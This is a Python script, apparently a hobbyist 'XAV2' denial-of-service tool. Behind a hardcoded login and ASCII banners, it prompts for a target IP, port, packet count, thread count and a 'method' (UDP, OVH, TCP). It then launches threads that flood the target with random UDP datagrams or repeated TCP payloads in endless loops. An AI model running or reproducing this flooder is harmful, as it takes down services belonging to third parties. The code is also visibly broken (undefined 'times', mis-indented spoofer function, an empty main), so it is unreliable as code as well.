import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m

██╗░░██╗░█████╗░██╗░░░██╗██████╗░
╚██╗██╔╝██╔══██╗██║░░░██║╚════██╗
░╚███╔╝░███████║╚██╗░██╔╝░░███╔═╝
░██╔██╗░██╔══██║░╚████╔╝░██╔══╝░░
██╔╝╚██╗██║░░██║░░╚██╔╝░░███████╗
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
""")

username = str(input("\033[94m[XAV2] \033[93mUsername:"))
password = str(input("\033[94m[XAV2] \033[93mPassword:"))
if password == "Aurasayang" and username == "Aurasayang":
    print ("Telah Masuk Sebagai Aura")
    time.sleep(2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.10)


nicknm = "AxeLL"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[94m

██████████████████████████████████████████
█▄─▀█▀─▄█▄─▄▄─█─▄─▄─█─█─█─▄▄─█▄─▄▄▀█─▄▄▄▄█
██─█▄█─███─▄█▀███─███─▄─█─██─██─██─█▄▄▄▄─█
▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀
""")
print("""\033[92m
| UDP             |
| OVH             |
| UDP-DOWN        |
| TCP             |
———————————————————
""")

ip = str(input("\033[91m====> ★ IP   : "))
port = int(input("====> $ PORT   : "))
time = int(input("====> $ PACKET   : "))
threads = int(input("====> $ THREADS   : "))
choice = str(input("====> ★ METHODS   : "))

os.system("clear")

def run():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run2():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run3():
	data = random._urandom(1025)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run4():
	data = random._urandom(1)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run5():
	data = random._urandom(1872637)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run6():
	data = random._urandom(146734)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run7():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
    def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
    
def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'UDPDOWN':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'TCP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'tcp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'OVHDOWN':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovhdown':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'OVH':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)